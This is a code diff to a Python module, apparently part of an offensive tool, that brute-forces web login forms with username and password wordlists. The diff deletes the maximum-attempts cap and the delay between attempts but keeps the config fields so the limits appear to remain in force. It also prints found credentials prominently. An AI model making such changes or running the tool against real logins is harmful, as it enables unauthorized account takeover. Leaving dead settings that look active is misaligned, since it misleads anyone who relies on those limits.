@@ -10,6 +10,7 @@ class CredentialTester(BaseModule):
     # ── FIX: added graph_manager=None to match the 5-arg call in raptor.py ──
     def __init__(self, config, stealth=None, db=None, graph_manager=None):
         super().__init__(config, stealth, db, graph_manager)
+        # keep config fields to avoid breaking other code
         self.max_attempts   = config.get('max_attempts', 50)
         self.delay          = config.get('delay_between', 1)
         self.wordlist_path  = config.get('wordlist_path', 'wordlists')
@@ -182,12 +183,9 @@ class CredentialTester(BaseModule):
         rate_limited      = False
         attempt_count     = 0
 
+        # NOTE: removed max_attempts limit and delay between attempts
         for username in usernames:
             for password in passwords:
-                if attempt_count >= self.max_attempts:
-                    self.logger.info(f"Reached max attempts limit ({self.max_attempts})")
-                    break
-
                 attempt_count += 1
                 login_data    = {username_field: username, password_field: password}
 
@@ -202,7 +200,6 @@ class CredentialTester(BaseModule):
                     is_success = await self._check_login_success(response, url)
 
                     if is_success:
-                        # ── CLEAR console output for found credentials ──────
                         sep = "=" * 60
                         print(f"\n\033[91m{sep}\033[0m")
                         print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
@@ -255,7 +252,7 @@ class CredentialTester(BaseModule):
                         self.logger.info(f"Rate limited after {attempt_count} attempts")
                         break
 
-                    text             = await response.text()
+                    text               = await response.text()
                     lockout_indicators = [
                         'locked', 'blocked', 'too many attempts',
                         'try again later', 'suspended'
@@ -266,8 +263,6 @@ class CredentialTester(BaseModule):
 
                 except Exception as e:
                     self.logger.error(f"Error during brute force attempt: {e}")
-
-                await asyncio.sleep(self.delay)
 
             if rate_limited or len(successful_logins) > 0:
                 break
@@ -295,7 +290,7 @@ class CredentialTester(BaseModule):
         try:
             if response.status in [200, 301, 302, 303, 307, 308]:
                 if 'Location' in response.headers:
-                    location     = response.headers['Location']
+                    location      = response.headers['Location']
                     success_paths = ['/dashboard', '/admin', '/home', '/profile',
                                      '/account', '/welcome']
                     if any(path in location.lower() for path in success_paths):
